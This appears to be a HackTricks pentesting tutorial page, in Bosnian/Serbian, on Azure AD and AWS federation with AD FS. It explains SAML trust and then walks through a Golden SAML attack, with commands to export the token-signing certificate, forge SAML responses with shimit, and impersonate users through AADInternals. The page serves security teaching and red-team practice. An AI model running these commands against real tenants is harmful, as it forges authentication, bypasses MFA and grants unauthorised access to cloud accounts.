# Az - Federation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Osnovne Informacije

[Iz dokumenata:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed)**Federacija** je kolekcija **domena** koje su uspostavile **povjerenje**. Nivo povjerenja može varirati, ali obično uključuje **autentifikaciju** i gotovo uvijek uključuje **autorizaciju**. Tipična federacija može uključivati **broj organizacija** koje su uspostavile **povjerenje** za **zajednički pristup** skupu resursa.

Možete **federirati vašu on-premises** okolinu **sa Azure AD** i koristiti ovu federaciju za autentifikaciju i autorizaciju. Ova metoda prijave osigurava da se sva korisnička **autentifikacija odvija on-premises**. Ova metoda omogućava administratorima da implementiraju rigoroznije nivoe kontrole pristupa. Federacija sa **AD FS** i PingFederate je dostupna.

<figure><img src="../../../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

U suštini, u Federaciji, sva **autentifikacija** se odvija u **on-prem** okruženju i korisnik doživljava SSO u svim pouzdanim okruženjima. Dakle, korisnici mogu **pristupiti** **cloud** aplikacijama koristeći svoje **on-prem kredencijale**.

**Security Assertion Markup Language (SAML)** se koristi za **razmjenu** svih informacija o autentifikaciji i autorizaciji **između provajdera**.

U bilo kojoj federacijskoj postavci postoje tri strane:

* Korisnik ili Klijent
* Identity Provider (IdP)
* Service Provider (SP)

(Slike sa https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<figure><img src="../../../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

1. U početku, aplikaciju (Service Provider ili SP, kao što je AWS konzola ili vSphere web klijent) pristupa korisnik. Ovaj korak može biti preskočen, vodeći klijenta direktno do IdP (Identity Provider) zavisno o specifičnoj implementaciji.
2. Nakon toga, SP identifikuje odgovarajući IdP (npr. AD FS, Okta) za autentifikaciju korisnika. Zatim kreira SAML (Security Assertion Markup Language) AuthnRequest i preusmjerava klijenta na odabrani IdP.
3. IdP preuzima, autentifikuje korisnika. Nakon autentifikacije, IdP formira SAMLResponse i prosljeđuje ga SP preko korisnika.
4. Na kraju, SP procjenjuje SAMLResponse. Ako je uspješno validiran, što implicira povjerenje sa IdP, korisniku se odobrava pristup. Ovo označava završetak procesa prijave, omogućavajući korisniku da koristi uslugu.

**Ako želite saznati više o SAML autentifikaciji i uobičajenim napadima, idite na:**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## Pivoting

* AD FS je model identiteta zasnovan na tvrdnjama.
* "..tvrdnje su jednostavno izjave (na primjer, ime, identitet, grupa), napravljene o korisnicima, koje se koriste prvenstveno za autorizaciju pristupa aplikacijama zasnovanim na tvrdnjama koje se nalaze bilo gdje na internetu."
* Tvrdnje za korisnika su napisane unutar SAML tokena i zatim su potpisane kako bi se osigurala povjerljivost od strane IdP.
* Korisnik je identifikovan pomoću ImmutableID. To je globalno jedinstveno i pohranjeno u Azure AD.
* ImmutableID je pohranjen on-prem kao ms-DS-ConsistencyGuid za korisnika i/ili se može izvesti iz GUID korisnika.
* Više informacija na [https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)

**Golden SAML napad:**

* U ADFS, SAML Response je potpisan certifikatom za potpisivanje tokena.
* Ako je certifikat kompromitovan, moguće je autentifikovati se na Azure AD kao BILO KOJI korisnik sinhronizovan sa Azure AD!
* Kao i kod našeg PTA zloupotrebe, promjena lozinke za korisnika ili MFA neće imati nikakav efekat jer mi falsifikujemo odgovor na autentifikaciju.
* Certifikat se može izvući sa AD FS servera sa DA privilegijama i zatim se može koristiti sa bilo kojeg uređaja povezanog na internet.
* Više informacija na [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

### Golden SAML

Proces u kojem **Identity Provider (IdP)** proizvodi **SAMLResponse** za autorizaciju prijave korisnika je ključan. Zavisno o specifičnoj implementaciji IdP-a, **odgovor** može biti **potpisan** ili **šifrovan** koristeći **privatni ključ IdP-a**. Ovaj postupak omogućava **Service Provider (SP)** da potvrdi autentičnost SAMLResponse, osiguravajući da je zaista izdat od strane pouzdanog IdP-a.

Paralela se može povući sa [golden ticket napadom](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket), gdje se ključ koji autentifikuje identitet i dozvole korisnika (KRBTGT za golden tickets, privatni ključ za potpisivanje tokena za golden SAML) može manipulirati kako bi se **falsifikovao objekt autentifikacije** (TGT ili SAMLResponse). Ovo omogućava imitaciju bilo kojeg korisnika, dajući neovlašteni pristup SP-u.

Golden SAML nudi određene prednosti:

* Mogu se **kreirati na daljinu**, bez potrebe da budu dio domene ili federacije u pitanju.
* Ostaju efikasni čak i sa **Two-Factor Authentication (2FA)** omogućenim.
* Privatni ključ za potpisivanje tokena **ne obnavlja se automatski**.
* **Promjena lozinke korisnika ne poništava** već generisani SAML.

#### AWS + AD FS + Golden SAML

[Active Directory Federation Services (AD FS)](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\)) je Microsoftova usluga koja omogućava **sigurnu razmjenu informacija o identitetu** između pouzdanih poslovnih partnera (federacija). U suštini, omogućava domen servisu da dijeli korisničke identitete sa drugim provajderima usluga unutar federacije.

Sa AWS-om koji vjeruje kompromitovanom domenu (u federaciji), ova ranjivost se može iskoristiti za potencijalno **sticanje bilo kojih dozvola u AWS okruženju**. Napad zahtijeva **privatni ključ korišten za potpisivanje SAML objekata**, slično kao što je potreban KRBTGT u golden ticket napadu. Pristup korisničkom računu AD FS-a je dovoljan za dobijanje ovog privatnog ključa.

Za izvršenje golden SAML napada potrebni su:

* **Privatni ključ za potpisivanje tokena**
* **Javni certifikat IdP-a**
* **Ime IdP-a**
* **Ime uloge (uloga koju treba preuzeti)**
* Domain\username
* Ime sesije uloge u AWS-u
* Amazon ID računa

_Samo su stavke u boldu obavezne. Ostale se mogu popuniti po želji._

Da biste dobili **privatni ključ**, potreban je pristup **korisničkom računu AD FS-a**. Odatle, privatni ključ se može **izvesti iz lične pohrane** koristeći alate kao što je [mimikatz](https://github.com/gentilkiwi/mimikatz). Da biste prikupili ostale potrebne informacije, možete koristiti Microsoft.Adfs.Powershell snapin na sledeći način, osiguravajući da ste prijavljeni kao ADFS korisnik:
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
Sa svim informacijama, moguće je zaboraviti validan SAMLResponse kao korisnik kojeg želite da se lažno predstavite koristeći [**shimit**](https://github.com/cyberark/shimit)**:**

{% code overflow="wrap" %}
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

### On-prem -> cloud
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
Takođe je moguće kreirati ImmutableID za korisnike samo u oblaku i lažno se predstavljati kao oni
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## Reference

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

{% hint style="success" %}
Naučite i vežbajte AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Naučite i vežbajte GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Pogledajte [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Delite hacking trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
